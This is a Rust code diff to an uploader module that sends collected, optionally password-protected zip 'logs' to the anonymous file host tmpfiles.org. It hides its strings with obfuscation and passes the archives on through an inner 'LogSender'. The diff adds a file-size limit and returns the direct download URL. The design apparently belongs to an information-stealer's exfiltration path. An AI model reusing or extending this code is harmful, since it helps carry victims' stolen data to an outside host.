@@ -8,6 +8,9 @@ use derive_new::new;
 use json::parse;
 use obfstr::obfstr as s;
 use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
+use utils::log_debug;
+
+const MAX_FILESIZE: usize = 100 * 1024 * 1024;
 
 /// https://tmpfiles.org uploader wrapper around an inner [`LogSender`].
 ///
@@ -35,17 +38,24 @@ fn upload(name: &str, bytes: &[u8]) -> Option<String> {
         parse(response.body())
             .ok()?
             .get(s!("data"))?
-            .get(s!("downloadPage"))?
+            .get(s!("url"))?
             .as_string()?
             .clone(),
     )
 }
 
 impl<T: LogSender> LogSender for TmpFilesUploader<T> {
-    delegate! {
-        to self.inner {
-            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
-            where P: AsRef<str> + Clone, C: Collector;
+    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    where
+        P: AsRef<str> + Clone,
+        C: Collector
+    {
+        if let LogContent::ZipArchive(archive) = &log_file.content
+            && archive.len() >= MAX_FILESIZE
+        {
+            Err(SendError::LogFileTooBig)
+        } else {
+            self.inner.send(log_file, password, collector)
         }
     }
 }
